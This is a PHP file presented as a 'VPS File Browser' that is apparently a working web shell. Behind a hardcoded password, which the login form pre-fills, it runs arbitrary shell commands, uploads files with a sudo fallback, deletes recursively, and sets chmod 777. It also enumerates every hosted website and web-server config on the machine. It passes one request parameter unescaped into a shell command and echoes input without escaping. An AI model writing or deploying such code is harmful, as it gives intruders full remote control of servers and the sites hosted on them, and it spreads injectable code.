<?php
// VPS File Browser - FULL SYSTEM CONTROL WITH DOMAIN DETECTION
// WARNING: THIS GIVES COMPLETE ROOT ACCESS TO YOUR SYSTEM!

session_start();

// Simple authentication
$valid_username = 'admin';
$valid_password = 'Iv@n0772717963';

// Handle login
if ($_POST['login'] ?? false) {
    if ($_POST['username'] === $valid_username && $_POST['password'] === $valid_password) {
        $_SESSION['authenticated'] = true;
        $_SESSION['username'] = $_POST['username'];
    } else {
        $error = "Invalid credentials!";
    }
}

// Handle logout
if ($_GET['logout'] ?? false) {
    session_destroy();
    header('Location: ?');
    exit;
}

// Check if authenticated
$authenticated = $_SESSION['authenticated'] ?? false;

// Get current directory - START FROM ROOT
$current_dir = $_GET['dir'] ?? '/';
$current_dir = realpath($current_dir) ?: '/';

// Handle file operations and commands
if ($authenticated) {
    // Execute system commands
    $command_output = '';
    if (isset($_POST['command']) && !empty($_POST['command'])) {
        $command = $_POST['command'];
        $command_output = shell_exec($command . " 2>&1");
    }
    
    // File upload
    if (isset($_FILES['file_upload']) && $_FILES['file_upload']['error'] === UPLOAD_ERR_OK) {
        $upload_path = $current_dir . '/' . $_FILES['file_upload']['name'];
        if (move_uploaded_file($_FILES['file_upload']['tmp_name'], $upload_path)) {
            $command_output = "File uploaded successfully: " . $_FILES['file_upload']['name'];
            chmod($upload_path, 0644);
        } else {
            $command_output = "File upload failed! Trying with sudo...";
            // Try with sudo
            $tmp_path = '/tmp/' . $_FILES['file_upload']['name'];
            move_uploaded_file($_FILES['file_upload']['tmp_name'], $tmp_path);
            shell_exec("sudo cp " . $tmp_path . " " . escapeshellarg($upload_path));
            shell_exec("sudo chmod 644 " . escapeshellarg($upload_path));
        }
    }
    
    // File operations
    if (isset($_GET['delete'])) {
        $file_to_delete = $current_dir . '/' . $_GET['delete'];
        if (is_dir($file_to_delete)) {
            shell_exec("rm -rf " . escapeshellarg($file_to_delete));
        } else {
            unlink($file_to_delete);
        }
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    
    if (isset($_GET['chmod'])) {
        $file_to_chmod = $current_dir . '/' . $_GET['chmod_file'];
        $new_perms = $_GET['chmod'];
        shell_exec("chmod " . $new_perms . " " . escapeshellarg($file_to_chmod));
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Create directory
    if (isset($_POST['new_dir'])) {
        $new_dir_path = $current_dir . '/' . $_POST['new_dir'];
        shell_exec("mkdir -p " . escapeshellarg($new_dir_path));
        header('Location: ?dir=' . urlencode($current_dir));
        exit;
    }
    
    // Navigate to directory
    if (isset($_GET['cd'])) {
        $new_dir = realpath($current_dir . '/' . $_GET['cd']);
        if ($new_dir && is_dir($new_dir)) {
            $current_dir = $new_dir;
            header('Location: ?dir=' . urlencode($current_dir));
            exit;
        }
    }
    
    // Read directory contents - MULTIPLE METHODS
    $files = [];
    
    // Method 1: Try direct PHP functions first
    if (is_dir($current_dir)) {
        $items = @scandir($current_dir);
        if ($items) {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                
                $full_path = $current_dir . '/' . $item;
                $files[] = [
                    'name' => $item,
                    'path' => $full_path,
                    'is_dir' => is_dir($full_path),
                    'size' => is_file($full_path) ? filesize($full_path) : 0,
                    'perms' => substr(sprintf('%o', fileperms($full_path)), -4),
                    'owner' => function_exists('posix_getpwuid') ? @posix_getpwuid(fileowner($full_path))['name'] : 'Unknown',
                    'modified' => date('Y-m-d H:i:s', filemtime($full_path)),
                    'readable' => is_readable($full_path)
                ];
            }
        }
    }
    
    // Method 2: If no files found, try shell command
    if (empty($files)) {
        $raw_list = shell_exec("ls -la " . escapeshellarg($current_dir) . " 2>&1");
        if ($raw_list && !empty(trim($raw_list))) {
            $lines = explode("\n", trim($raw_list));
            foreach ($lines as $line) {
                if (empty($line) || strpos($line, 'total ') === 0) continue;
                
                $parts = preg_split('/\s+/', $line, 9);
                if (count($parts) < 9) continue;
                
                $perms = $parts[0];
                $owner = $parts[2];
                $group = $parts[3];
                $size = $parts[4];
                $date = $parts[5] . ' ' . $parts[6] . ' ' . $parts[7];
                $name = $parts[8];
                
                if ($name === '.' || $name === '..') continue;
                
                $full_path = $current_dir . '/' . $name;
                $files[] = [
                    'name' => $name,
                    'path' => $full_path,
                    'is_dir' => $perms[0] === 'd',
                    'size' => $size,
                    'perms' => $perms,
                    'owner' => $owner,
                    'group' => $group,
                    'modified' => $date,
                    'readable' => true
                ];
            }
        }
    }
    
    // Detect websites and domains
    $websites = [];
    
    // Common web directories to check
    $web_dirs = [
        '/var/www',
        '/home',
        '/var/www/html', 
        '/usr/share/nginx/html',
        '/srv/http',
        '/opt/lampp/htdocs'
    ];
    
    foreach ($web_dirs as $web_dir) {
        if (is_dir($web_dir)) {
            $items = @scandir($web_dir);
            if ($items) {
                foreach ($items as $item) {
                    if ($item === '.' || $item === '..') continue;
                    $full_path = $web_dir . '/' . $item;
                    if (is_dir($full_path)) {
                        $websites[] = [
                            'name' => $item,
                            'path' => $full_path,
                            'type' => 'Website Directory'
                        ];
                    }
                }
            }
        }
    }
    
    // Try to find domain configurations
    $domains = [];
    
    // Check Apache sites
    if (is_dir('/etc/httpd/conf.d')) {
        $apache_configs = @scandir('/etc/httpd/conf.d');
        if ($apache_configs) {
            foreach ($apache_configs as $config) {
                if (pathinfo($config, PATHINFO_EXTENSION) === 'conf') {
                    $domains[] = [
                        'name' => $config,
                        'path' => '/etc/httpd/conf.d/' . $config,
                        'type' => 'Apache Config'
                    ];
                }
            }
        }
    }
    
    // Check Nginx sites
    if (is_dir('/etc/nginx/conf.d')) {
        $nginx_configs = @scandir('/etc/nginx/conf.d');
        if ($nginx_configs) {
            foreach ($nginx_configs as $config) {
                if (pathinfo($config, PATHINFO_EXTENSION) === 'conf') {
                    $domains[] = [
                        'name' => $config,
                        'path' => '/etc/nginx/conf.d/' . $config,
                        'type' => 'Nginx Config'
                    ];
                }
            }
        }
    }
    
    // Check for virtual hosts in home directories
    $home_dirs = @scandir('/home');
    if ($home_dirs) {
        foreach ($home_dirs as $home_dir) {
            if ($home_dir === '.' || $home_dir === '..') continue;
            $public_html = '/home/' . $home_dir . '/public_html';
            if (is_dir($public_html)) {
                $websites[] = [
                    'name' => $home_dir . ' (public_html)',
                    'path' => $public_html,
                    'type' => 'User Website'
                ];
            }
        }
    }
    
    // System information
    $system_info = [
        'PHP Version' => phpversion(),
        'Server Software' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
        'Current User' => shell_exec('whoami'),
        'System Load' => function_exists('sys_getloadavg') ? implode(', ', sys_getloadavg()) : 'N/A',
        'Memory Usage' => round(memory_get_usage(true) / 1024 / 1024, 2) . ' MB',
        'Disk Free Space' => round(disk_free_space($current_dir) / (1024 * 1024 * 1024), 2) . ' GB',
        'Uptime' => shell_exec('uptime'),
        'Web Server' => shell_exec('ps aux | grep -E "(nginx|apache|httpd)" | grep -v grep | head -1')
    ];
    
    // Quick access directories
    $quick_dirs = [
        '/' => 'Root',
        '/home' => 'Home Directories',
        '/var/www' => 'Websites',
        '/var/www/html' => 'HTML Root',
        '/etc' => 'System Config',
        '/etc/nginx' => 'Nginx Config',
        '/etc/httpd' => 'Apache Config',
        '/var/log' => 'Log Files',
        '/root' => 'Root Home'
    ];
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VPS File Browser - FULL DOMAIN ACCESS</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #1a1a1a; color: #fff; padding: 20px; }
        .container { max-width: 1800px; margin: 0 auto; background: #2d2d2d; border-radius: 8px; box-shadow: 0 2px 20px rgba(0,0,0,0.5); }
        .header { background: #27ae60; color: white; padding: 20px; border-radius: 8px 8px 0 0; }
        .content { padding: 20px; }
        .login-form { max-width: 400px; margin: 50px auto; padding: 20px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; font-weight: bold; }
        input[type="text"], input[type="password"], textarea, select { 
            width: 100%; padding: 10px; border: 1px solid #555; border-radius: 4px; 
            background: #3d3d3d; color: white; 
        }
        button { background: #3498db; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; }
        button:hover { background: #2980b9; }
        .danger { background: #e74c3c; }
        .danger:hover { background: #c0392b; }
        .success { background: #27ae60; }
        .success:hover { background: #229954; }
        .error { background: #e74c3c; color: white; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .output { background: #000; color: #0f0; padding: 15px; border-radius: 4px; margin: 10px 0; font-family: monospace; white-space: pre-wrap; }
        .file-browser { margin-top: 20px; }
        .breadcrumb { background: #3d3d3d; padding: 10px; border-radius: 4px; margin-bottom: 15px; }
        .file-table { width: 100%; border-collapse: collapse; }
        .file-table th, .file-table td { padding: 12px; text-align: left; border-bottom: 1px solid #555; }
        .file-table th { background: #34495e; color: white; }
        .file-table tr:hover { background: #3d3d3d; }
        .dir { color: #3498db; font-weight: bold; }
        .file { color: #ecf0f1; }
        .size { text-align: right; font-family: monospace; }
        .actions { margin-top: 20px; padding-top: 20px; border-top: 1px solid #555; }
        .logout { float: right; background: #e74c3c; }
        .system-info, .quick-access, .websites-panel, .command-panel { 
            background: #3d3d3d; padding: 15px; border-radius: 4px; margin-bottom: 20px; 
        }
        .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 10px; }
        .quick-links { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 10px; margin-top: 10px; }
        .quick-link { background: #3498db; color: white; padding: 10px; border-radius: 4px; text-decoration: none; text-align: center; }
        .quick-link:hover { background: #2980b9; }
        .website-list, .domain-list { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 10px; margin-top: 10px; }
        .website-item, .domain-item { background: #4d4d4d; padding: 15px; border-radius: 4px; }
        .panel-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
        .file-actions { margin: 10px 0; }
        .warning { background: #f39c12; color: black; padding: 10px; border-radius: 4px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌐 VPS File Browser - FULL DOMAIN ACCESS</h1>
            <p>🚀 Complete website and domain control</p>
        </div>
        
        <div class="content">
            <?php if (!$authenticated): ?>
                <!-- Login Form -->
                <div class="login-form">
                    <?php if (isset($error)): ?>
                        <div class="error"><?php echo htmlspecialchars($error); ?></div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <input type="hidden" name="login" value="1">
                        <div class="form-group">
                            <label for="username">Username:</label>
                            <input type="text" id="username" name="username" value="admin" required>
                        </div>
                        <div class="form-group">
                            <label for="password">Password:</label>
                            <input type="password" id="password" name="password" value="Iv@n0772717963" required>
                        </div>
                        <button type="submit" class="success">Login</button>
                    </form>
                </div>
                
            <?php else: ?>
                <!-- Control Panel -->
                <div class="actions">
                    <span>Welcome, <?php echo htmlspecialchars($_SESSION['username']); ?>! (FULL ACCESS)</span>
                    <a href="?logout=1" class="logout danger">Logout</a>
                </div>

                <!-- System Information -->
                <div class="system-info">
                    <h3>📊 System Information</h3>
                    <div class="info-grid">
                        <?php foreach ($system_info as $key => $value): ?>
                            <div><strong><?php echo htmlspecialchars($key); ?>:</strong> <?php echo htmlspecialchars($value); ?></div>
                        <?php endforeach; ?>
                    </div>
                </div>
                
                <!-- Detected Websites -->
                <?php if (!empty($websites)): ?>
                <div class="websites-panel">
                    <h3>🌐 Detected Websites</h3>
                    <div class="website-list">
                        <?php foreach ($websites as $website): ?>
                            <div class="website-item">
                                <strong><?php echo htmlspecialchars($website['name']); ?></strong><br>
                                <small>Type: <?php echo htmlspecialchars($website['type']); ?></small><br>
                                <small>Path: <?php echo htmlspecialchars($website['path']); ?></small><br>
                                <a href="?dir=<?php echo urlencode($website['path']); ?>" class="quick-link">Browse Files</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>
                
                <!-- Detected Domain Configs -->
                <?php if (!empty($domains)): ?>
                <div class="websites-panel">
                    <h3>🔧 Domain Configurations</h3>
                    <div class="domain-list">
                        <?php foreach ($domains as $domain): ?>
                            <div class="domain-item">
                                <strong><?php echo htmlspecialchars($domain['name']); ?></strong><br>
                                <small>Type: <?php echo htmlspecialchars($domain['type']); ?></small><br>
                                <a href="?dir=<?php echo urlencode(dirname($domain['path'])); ?>" class="quick-link">View Config</a>
                            </div>
                        <?php endforeach; ?>
                    </div>
                </div>
                <?php endif; ?>
                
                <!-- Command Panel -->
                <div class="panel-grid">
                    <div class="command-panel">
                        <h3>💻 Command Execution</h3>
                        <form method="POST">
                            <input type="text" name="command" placeholder="Enter system command" style="width: 100%;" value="<?php echo $_POST['command'] ?? ''; ?>">
                            <button type="submit" class="danger">Execute Command</button>
                        </form>
                        <?php if (!empty($command_output)): ?>
                            <div class="output"><?php echo htmlspecialchars($command_output); ?></div>
                        <?php endif; ?>
                    </div>
                    
                    <div class="command-panel">
                        <h3>📁 File Operations</h3>
                        <form method="POST">
                            <input type="text" name="new_dir" placeholder="New directory name" style="width: 100%;">
                            <button type="submit" class="success">Create Directory</button>
                        </form>
                        
                        <form method="POST" enctype="multipart/form-data" style="margin-top: 10px;">
                            <input type="file" name="file_upload">
                            <button type="submit" class="success">Upload File</button>
                        </form>
                    </div>
                </div>
                
                <!-- Quick Access -->
                <div class="quick-access">
                    <h3>🚀 Quick Access</h3>
                    <div class="quick-links">
                        <?php foreach ($quick_dirs as $path => $name): ?>
                            <a href="?dir=<?php echo urlencode($path); ?>" class="quick-link">
                                <?php echo htmlspecialchars($name); ?>
                            </a>
                        <?php endforeach; ?>
                    </div>
                </div>
                
                <!-- Breadcrumb Navigation -->
                <div class="breadcrumb">
                    <?php
                    $path_parts = [];
                    $temp_path = $current_dir;
                    while ($temp_path !== '/' && $temp_path !== dirname($temp_path)) {
                        $path_parts[] = ['name' => basename($temp_path) ?: '/', 'path' => $temp_path];
                        $temp_path = dirname($temp_path);
                    }
                    $path_parts[] = ['name' => 'Root', 'path' => '/'];
                    $path_parts = array_reverse($path_parts);
                    
                    foreach ($path_parts as $index => $part) {
                        if ($index > 0) echo ' / ';
                        if ($part['path'] !== $current_dir) {
                            echo '<a href="?dir=' . urlencode($part['path']) . '">' . htmlspecialchars($part['name']) . '</a>';
                        } else {
                            echo '<strong>' . htmlspecialchars($part['name']) . '</strong>';
                        }
                    }
                    ?>
                </div>
                
                <!-- File List -->
                <div class="file-browser">
                    <table class="file-table">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th>Size</th>
                                <th>Permissions</th>
                                <th>Owner</th>
                                <th>Modified</th>
                                <th>Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if ($current_dir !== '/'): ?>
                                <tr>
                                    <td colspan="6">
                                        <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>">📁 .. (Parent Directory)</a>
                                    </td>
                                </tr>
                            <?php endif; ?>
                            
                            <?php if (empty($files)): ?>
                                <tr>
                                    <td colspan="6" style="text-align: center; color: #666;">
                                        Directory is empty or cannot be accessed. Try using command panel.
                                    </td>
                                </tr>
                            <?php else: ?>
                                <?php foreach ($files as $file): ?>
                                    <tr>
                                        <td>
                                            <?php if ($file['is_dir']): ?>
                                                📁 <a href="?dir=<?php echo urlencode($file['path']); ?>" class="dir">
                                                    <?php echo htmlspecialchars($file['name']); ?>/
                                                </a>
                                            <?php else: ?>
                                                📄 <span class="file"><?php echo htmlspecialchars($file['name']); ?></span>
                                            <?php endif; ?>
                                        </td>
                                        <td class="size">
                                            <?php if (!$file['is_dir']): ?>
                                                <?php
                                                $size = $file['size'];
                                                if ($size >= 1024 * 1024 * 1024) {
                                                    echo round($size / (1024 * 1024 * 1024), 2) . ' GB';
                                                } elseif ($size >= 1024 * 1024) {
                                                    echo round($size / (1024 * 1024), 2) . ' MB';
                                                } elseif ($size >= 1024) {
                                                    echo round($size / 1024, 2) . ' KB';
                                                } else {
                                                    echo $size . ' B';
                                                }
                                                ?>
                                            <?php else: ?>
                                                <em>DIR</em>
                                            <?php endif; ?>
                                        </td>
                                        <td><code><?php echo htmlspecialchars($file['perms']); ?></code></td>
                                        <td><?php echo htmlspecialchars($file['owner']); ?></td>
                                        <td><?php echo htmlspecialchars($file['modified']); ?></td>
                                        <td class="file-actions">
                                            <?php if (!$file['is_dir']): ?>
                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
                                                   class="danger" 
                                                   onclick="return confirm('Delete <?php echo htmlspecialchars($file['name']); ?>?')">Delete</a>
                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&chmod=777&chmod_file=<?php echo urlencode($file['name']); ?>">chmod 777</a>
                                            <?php else: ?>
                                                <a href="?dir=<?php echo urlencode($current_dir); ?>&delete=<?php echo urlencode($file['name']); ?>" 
                                                   class="danger" 
                                                   onclick="return confirm('DELETE ENTIRE DIRECTORY: <?php echo htmlspecialchars($file['name']); ?>? This cannot be undone!')">Delete</a>
                                            <?php endif; ?>
                                        </td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            <?php endif; ?>
        </div>
    </div>
</body>
</html>